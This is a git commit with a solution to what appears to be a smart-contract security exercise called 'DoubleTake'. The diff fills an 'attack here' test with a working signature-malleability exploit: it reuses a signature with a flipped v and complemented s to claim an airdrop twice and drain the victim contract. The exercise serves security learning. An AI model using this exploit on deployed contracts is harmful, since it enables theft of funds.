2ea44bdfcc3c1fe92326d8179ae18b37d44e937c
Huw Grano <huw.grano@gmail.com>
2024-07-14 14:36:58 +0930

    double take solution

--- test/DoubleTake.js
+++ test/DoubleTake.js
@@ -30,7 +30,15 @@ describe(NAME, function () {
                 .claimAirdrop("0x70997970c51812dc3a010c7d01b50e0d17dc79c8", ethers.utils.parseEther("1"), v, r, s);
         });
 
-        it("conduct your attack here", async function () {});
+        it("conduct your attack here", async function () {
+            const v_alternate = 27;
+            const r = "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
+            const s_alternate = "0x8b8834677ec2afeea8ea9169a4815ca4c4c81bde36aa2f63e94b20597b7ce1d8"; // -s modulo n
+
+            await victimContract
+                .connect(attackerWallet)
+                .claimAirdrop("0x70997970c51812dc3a010c7d01b50e0d17dc79c8", ethers.utils.parseEther("1"), v_alternate, r, s_alternate);
+        });
 
         after(async function () {
             expect(await ethers.provider.getBalance(victimContract.address)).to.equal(0, "victim contract is drained");
